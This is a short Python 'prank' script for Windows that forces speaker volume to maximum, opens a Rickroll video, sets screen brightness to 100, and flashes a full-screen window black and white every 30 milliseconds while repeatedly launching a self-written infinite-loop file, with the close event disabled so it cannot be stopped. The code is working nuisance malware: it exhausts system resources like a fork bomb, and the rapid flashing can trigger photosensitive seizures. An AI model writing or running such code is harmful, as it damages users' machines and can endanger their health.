from ctypes import cast, POINTER, windll, Structure, c_long, byref
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import time
import webbrowser
import ctypes
import pygame
import screen_brightness_control as sbc
import os

#lag
with open('never.py', 'w') as f:
  f.write('while True:\n    pass')
a=os.path.abspath("never.py")

#Set max volume
devices = AudioUtilities.GetSpeakers()
interface = devices.Activate(
    IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
volume = cast(interface, POINTER(IAudioEndpointVolume))
volume.GetMute()
volume.GetMasterVolumeLevel()
volume.GetVolumeRange()
volume.SetMasterVolumeLevel(0, None)

#Play RickRoll!
webbrowser.open('https://youtu.be/mKV8svVMYTI')
time.sleep(1)

#stunt ur eyes
#get screen resolution
user32 = ctypes.windll.user32
user32.SetProcessDPIAware()
[w, h] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]

#set flashing window size
screen = pygame.display.set_mode((w, h))

#max screen brightness
sbc.set_brightness(100)

pygame.display.set_caption('window')
running = True

while running:
  os.startfile(a)
  sbc.set_brightness(100)
  volume.SetMute(0, None)
  background_colour = (255,255,255)
  screen.fill(background_colour)
  pygame.display.flip()
  time.sleep(0.03)
  background_colour = (0,0,0)
  screen.fill(background_colour)
  pygame.display.flip()
  time.sleep(0.03)
  volume.SetMasterVolumeLevel(0, None)
  for event in pygame.event.get():
    if event.type == pygame.QUIT:
      running = True    #can't turn off!
